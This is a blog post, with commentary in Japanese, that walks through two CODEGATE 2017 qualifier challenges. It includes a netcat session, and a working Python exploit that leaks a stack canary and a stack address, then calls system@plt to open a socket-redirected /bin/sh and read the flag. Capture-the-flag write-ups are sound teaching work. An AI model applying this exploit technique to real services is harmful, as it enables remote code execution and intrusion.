---
layout : post
title : CODEGATE 2017 prequals writeup
---

## BabyMISC

```

$ (echo TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA; echo aa; echo aaa; echo 'head *' | base64 ; cat) | nc 110.10.212.138 19091
[*] Ok, Let's Start. Input the write string on each stage!:)
[*] -- STAGE 01 ----------
[+] KEY : H??x?H)?H?H???L??H)??1??D
[+] Input > 
[*] USER : N0_m4n_c4l1_ag4in_Y3st3rd4y:(
[+] -- NEXT STAGE! ----------
[*] -- STAGE 02 ----------
[+] Input 1 
[+] Input 2 
[+] -- NEXT STAGE! ----------
[*] -- STAGE 03 ----------
[+] Ok, It's easy task to you, isn't it? :)
[+] So I will give a chance to execute one command! :)
[*] Input > 
#                                                               echo -n aGVhZCAqCg== | base64 -d | sh
FLAG{Nav3r_L3t_y0ur_L3ft_h4nd_kn0w_wh4t_y0ur_r1ghT_h4nd5_H4ck1ng}

```


## Babypwn

BOFがあるがcanaryのチェックに引っかかってしまい__stack_chk_fail()が呼ばれる.

しかしstack上にcanaryが積まれていたのでリークする.

canaryの最下位バイトが` \x00 `になる & send()はヌル文字が出力されるまでsendする(多分)ので
ヌル文字を潰して, `\x00` + 3byteがcanaryとなる.

あとはsystem@pltを使って"/bin/sh"を起動したいがfork型なのでfdを標準入出力に向けないといけない.
`'/bin/sh <&4 >&4 2>&4;'`

これはstackのアドレスもリークしてstackに積んだ

それと詰まった所があとひとつあって, systep@pltを配置するまえに "/bin/sh"を配置してしまい
system@pltが呼び出されているにも関わらずシェルが起動しなくつらい状態になっていた.

system@pltを配置したあとに文字列を置いてそこを指定すると上手く動いた.


{% highlight python %}

from No___Op import *

if len(sys.argv) > 1:
    target = '110.10.212.130:8889'

else:
    target = 'localhost:8181'

c = Pwning( target )

plt_system = 0x08048620 #+ 0x10

c.sendall('1')
time.sleep(1)
c.sendall('a' * 0x28)
c.read_until('a' * 28 + '\n')
canary = u32('\x00' + c.recv(3))

succ('canary: ' + hex(canary))

c.sendall('1')
time.sleep(1)
c.sendall('a' * (0x28 + 4 + 4 + 3))
c.read_until('a' * (0x28 + 4 + 4 + 3) + '\n')
addr_stack = u32(c.recv(4)) - 0x174 # buffer

succ('stack_addr: ' + hex(addr_stack))

payload  = ''
payload += 'a' * (40 - len(payload))
payload += p32(canary)
payload += 'a' * 12
payload += p32(plt_system)
payload += 'gomi'
payload += p32(addr_stack + len(payload) + 4)
payload += '/bin/sh <&4 >&4 2>&4;'
payload += 'c' * (0x64 - len(payload))

c.sendall('1')
time.sleep(0.5)
c.sendall(payload)
time.sleep(0.5)
c.sendall('3')

c.shell()

{% endhighlight %}

{% highlight sh %}

$ python exp.py r
[*]Connecting "110.10.212.130:8889"...
[+]Connection success!
[+]canary: 0xcc781900
[+]stack_addr: 0xffca6f34
*** 4ll y0u n33d i5 5HELL! ***


Time Out!
ls
babypwn
flag

cat flag
FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}
exit
*** Connection closed by remote host ***

{% endhighlight %}
